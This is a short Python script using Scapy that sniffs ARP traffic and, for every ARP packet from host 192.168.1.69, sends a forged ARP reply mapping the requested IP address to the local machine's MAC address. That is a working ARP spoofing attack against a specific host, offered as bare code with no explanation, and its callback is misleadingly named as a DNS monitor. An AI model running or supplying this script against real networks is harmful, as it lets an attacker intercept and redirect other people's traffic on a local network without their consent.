#!/usr/bin/python
from scapy.all import *
import uuid

def dnsMonitorCallBack(pkt):
	if pkt.haslayer(ARP) and pkt[ARP].psrc == '192.168.1.69':
		packet = NewPacket(pkt)
		send(packet)

def NewPacket(pkt):
	packet = ARP( hwsrc=get_mac(), psrc=pkt[ARP].pdst, hwdst=pkt[ARP].hwsrc, pdst=pkt[ARP].psrc, op=2)
	return packet

def get_mac():
	return str(':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])).upper()

sniff(prn=dnsMonitorCallBack)
